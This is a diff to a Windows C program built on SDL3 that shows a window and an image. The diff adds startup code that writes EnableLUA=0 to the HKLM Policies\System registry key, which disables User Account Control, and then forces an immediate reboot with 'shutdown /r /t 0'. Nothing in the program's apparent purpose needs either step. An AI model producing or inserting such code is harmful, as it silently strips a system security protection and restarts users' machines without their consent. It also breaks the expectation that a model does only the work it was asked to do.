@@ -1,6 +1,7 @@
 #include <SDL3/SDL.h>
 #include <windows.h>
 #include <mmsystem.h>
+#include <stdio.h>
 
 int main()
 {
@@ -8,6 +9,29 @@ int main()
   SDL_Renderer *renderer;
   SDL_Surface *surface;
   SDL_Texture *texture;
+
+  HKEY hKey;
+  LPCSTR subKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
+  DWORD value = 0;
+  DWORD existingValue = 1;
+  DWORD size = sizeof(DWORD);
+
+  if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | KEY_SET_VALUE | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+
+    DWORD result = RegQueryValueExA(hKey, "EnableLUA", NULL, NULL, (LPBYTE)&existingValue, &size);
+    printf("result: %d\n", existingValue);
+
+    if (existingValue != 0) {
+      if (RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (const BYTE*)&value, sizeof(value)) != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+      }
+      system("shutdown /r /t 0");
+    }
+  }
+
+  RegCloseKey(hKey);
+
+
 
   if (!SDL_Init(SDL_INIT_VIDEO) || !SDL_Init(SDL_INIT_AUDIO))
   {
@@ -22,10 +46,6 @@ int main()
       SDL_WINDOW_OPENGL,
       &window,
       &renderer);
-
-  // const SDL_AudioSpec srcspec = {SDL_AUDIO_S16, 1, 22050};
-  // const SDL_AudioSpec dstspec = {SDL_AUDIO_F32, 2, 48000};
-  // SDL_AudioStream *stream = SDL_CreateAudioStream(&srcspec, &dstspec);
 
   surface = SDL_LoadBMP("assets/fuck.bmp");
   texture = SDL_CreateTextureFromSurface(renderer, surface);
